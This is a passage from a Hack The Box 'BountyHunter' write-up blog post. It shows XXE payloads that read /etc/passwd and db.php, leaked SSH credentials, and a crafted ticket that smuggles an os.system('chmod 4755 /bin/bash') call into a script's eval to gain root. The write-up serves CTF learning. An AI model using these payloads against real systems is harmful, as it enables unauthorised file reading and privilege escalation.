</pre></table></code></div></div><p>Then, we will proceed to encode this payload. First, we will encode it in Base64 and then, in URL encode:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite Decoder</em></p><p>Lastly, we will insert the created payload into the data parameter of the HTTP POST request:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite HTTP Request</em></p><p>Once we send the HTTP request, we can see what happens in the browser:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe6.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Browser</em></p><p>We can see that our external entity named <code class="language-plaintext highlighter-rouge">example</code>, that contained the <code class="language-plaintext highlighter-rouge">'test'</code> string, is being represented in the <code class="language-plaintext highlighter-rouge">reward</code> field. So now we can say that the server is vulnerable to XXE Injection.</p><p>Now, we will try to read files from the target machine. To do this, we can use the wrapper named <code class="language-plaintext highlighter-rouge">file</code>. In this case, we will list the <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code> file, using the following payload and repeating the process explained above:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE reward [ 
	&lt;!ELEMENT reward ANY &gt;</span>
	<span class="cp">&lt;!ENTITY file SYSTEM "file:///etc/passwd" &gt;</span>]&gt;
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span>a<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>a<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>a<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe7.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>/etc/passwd displaying</em></p><p>We can see that we are being displayed the <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code> of the target machine. This is always useful to identify the users of the machine, since we can see their home directories and if they have a shell assigned or not. In this case, we have the users <code class="language-plaintext highlighter-rouge">development</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p><p>As we remember from the enumeration phase, we had a file called <code class="language-plaintext highlighter-rouge">db.php</code> that we could not read because it was being interpreted by the web server. Since we are able to read files from the victim machine, we will try to use a <code class="language-plaintext highlighter-rouge">PHP</code> wrapper that encodes the content of a file in Base64 and displays it. We will use it to read the contents of the <code class="language-plaintext highlighter-rouge">db.php</code> file. To do this, we will use the following payload:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE reward [ 
	&lt;!ELEMENT reward ANY &gt;</span>
	<span class="cp">&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php" &gt;</span>]&gt;
		<span class="nt">&lt;bugreport&gt;</span>
		<span class="nt">&lt;title&gt;</span>a<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;cwe&gt;</span>a<span class="nt">&lt;/cwe&gt;</span>
		<span class="nt">&lt;cvss&gt;</span>a<span class="nt">&lt;/cvss&gt;</span>
		<span class="nt">&lt;reward&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/reward&gt;</span>
		<span class="nt">&lt;/bugreport&gt;</span>
</pre></table></code></div></div><p>Once we have got the response from the server, we will decode the displayed Base64 string using the following command:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe8.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>db.php decoding</em></p><div file="credentials/sshCreds.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/sshCreds.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>admin:m19RoAU0hP41A1sTsq6K
</pre></table></code></div></div><p>We can see that we have got some credentials. As we don‚Äôt have any login panel on the web server, we will try to determine if the user is reusing this password. We will try the found credentials in the other service that we identified in the enumeration phase, SSH. We already know that there is a user called <code class="language-plaintext highlighter-rouge">development</code>, as we have seen it in the <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code> file. We will try to connect with the following command and the found password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh development@10.10.11.100
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/xxe9.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>whoami development</em></p><p>We can see that we have a shell as the user <code class="language-plaintext highlighter-rouge">development</code>. So we proceed to read the <code class="language-plaintext highlighter-rouge">user.txt</code> flag located in the <code class="language-plaintext filepath highlighter-rouge">/home/development/</code> directory.</p><h2 id="root-shell"><span class="mr-2">Root Shell</span><a href="#root-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="passwordless-sudo"><span class="mr-2">Passwordless sudo</span><a href="#passwordless-sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we are the <code class="language-plaintext highlighter-rouge">development</code> user, we will try to escalate privileges to become the <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>We will start our enumeration by listing the commands that we can run as sudo. We can use the following command for that:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-l</span>
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/sudo1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>sudo privileges</em></p><p>We can see that we have the capacity to execute the <code class="language-plaintext filepath highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code> script with <code class="language-plaintext highlighter-rouge">python3.8</code>, being the <code class="language-plaintext highlighter-rouge">root</code> user and not having to provide a password.</p><h3 id="python-script-source-code-analysis"><span class="mr-2">Python Script Source Code Analysis</span><a href="#python-script-source-code-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will proceed to analyze the <code class="language-plaintext filepath highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code> file (some parts of the script are commented to better understand how it works):</p><div file="scripts/ticketValidator.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="scripts/ticketValidator.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="c1"># Checks for .md extension and loads file
</span>    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for irregularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>  <span class="c1"># i: Number of line, x: Content of the line 
</span>        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span> <span class="c1"># First line content
</span>                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>  <span class="c1"># Second line content
</span>                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="si">:</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>       <span class="c1"># Third line content
</span>            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>           <span class="c1"># Fourth line content
</span>            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>             <span class="c1"># Has to start with **
</span>                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># Has to have a + sign
</span>            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>           <span class="c1"># The first operand of the sum needs to have a 4 reminder when divided by 7,  'x * 7 + 4 = ticketCode'
</span>                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span> <span class="c1"># Evaluates the complete expression after removing the ** signs
</span>                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>         <span class="c1"># We have done the eval so this condition does not really matter
</span>                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># Main function
</span>    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>          
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>


<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>We can see that this script is pretty simple. First, there is a prompt with an input to enter the ticket that we want to validate. Then, a validation is done to see if the extension of the file is <code class="language-plaintext highlighter-rouge">.md</code>. Following that, the contents of each line of the file are validated, each with a different set of conditions. Lastly, one of the lines, exactly the last one, is being used in an <code class="language-plaintext highlighter-rouge">eval</code> expression. Once again, the user input is not being sanitized and, on top of that, is being passed to the <code class="language-plaintext highlighter-rouge">eval</code> function as an argument. Since we know the structure that the file has to have and that one of the lines is being evaluated, we will create a malicious payload.</p><p>We will try to execute the following command on it. This lets us change the permissions of the bash binary to <code class="language-plaintext highlighter-rouge">SUID</code> (Set User ID), thus making it possible to execute it in privileged mode (as <code class="language-plaintext highlighter-rouge">root</code>) while being a non-privileged user:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">chmod </span>4755 /bin/bash
</pre></table></code></div></div><p>Knowing the needed structure and the payload we want to execute, we will construct the following file:</p><div file="scripts/test.md" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="scripts/test.md"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1"># Skytrain Inc
## Ticket to hola
</span><span class="n">__Ticket</span> <span class="n">Code</span><span class="p">:</span><span class="n">__</span>
<span class="o">**</span><span class="mi">11</span><span class="o">+</span><span class="mi">100</span> <span class="ow">and</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"os"</span><span class="p">).</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod 4755 /bin/bash"</span><span class="p">)</span><span class="o">**</span>
</pre></table></code></div></div><p>Once we have our payload prepared, we will execute the <code class="language-plaintext highlighter-rouge">ticketvalidator.py</code> as <code class="language-plaintext highlighter-rouge">root</code> and we will indicate our freshly created payload as the ticket to validate:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/sudo2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Exploiting sudo privileges</em></p><p>After executing it, we can see that the <code class="language-plaintext filepath highlighter-rouge">/bin/bash</code> binary has <code class="language-plaintext highlighter-rouge">SUID</code> permission, so we can use the following command to execute it as the <code class="language-plaintext highlighter-rouge">root</code> user:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash <span class="nt">-p</span>
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/bountyhunter/sudo3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>root shell</em></p><p>We can see that we are the <code class="language-plaintext highlighter-rouge">root</code> user so we proceed to visualize the <code class="language-plaintext highlighter-rouge">root.txt</code>flag in the <code class="language-plaintext filepath highlighter-rouge">/root/</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BountyHunter+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbountyhunter%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BountyHunter+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbountyhunter%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbountyhunter%2F&text=BountyHunter+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbountyhunter%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/knife/"><div class="card-body"> <em class="small" data-ts="1664521200" data-df="ll" > Sep 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start scanning the target machine. To do this, we will use nmap. The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Opt...</p></div></div></a></div><div class="card"> <a href="/posts/cap/"><div class="card-body"> <em class="small" data-ts="1664780400" data-df="ll" > Oct 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap Write-up</h3><div class="text-muted small"><p> Enumeration OS Detection In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response ca...</p></div></div></a></div><div class="card"> <a href="/posts/love/"><div class="card-body"> <em class="small" data-ts="1664348400" data-df="ll" > Sep 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Love Write-up</h3><div class="text-muted small"><p> Enumeration Nmap As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved nmap. The scan that we will be using scans all the port range, displ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/whoami/" class="btn btn-outline-primary" prompt="Older"><p>whoami</p></a> <a href="/posts/love/" class="btn btn-outline-primary" prompt="Newer"><p>Love Write-up</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/bountyhunter/'; this.page.identifier = '/posts/bountyhunter/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
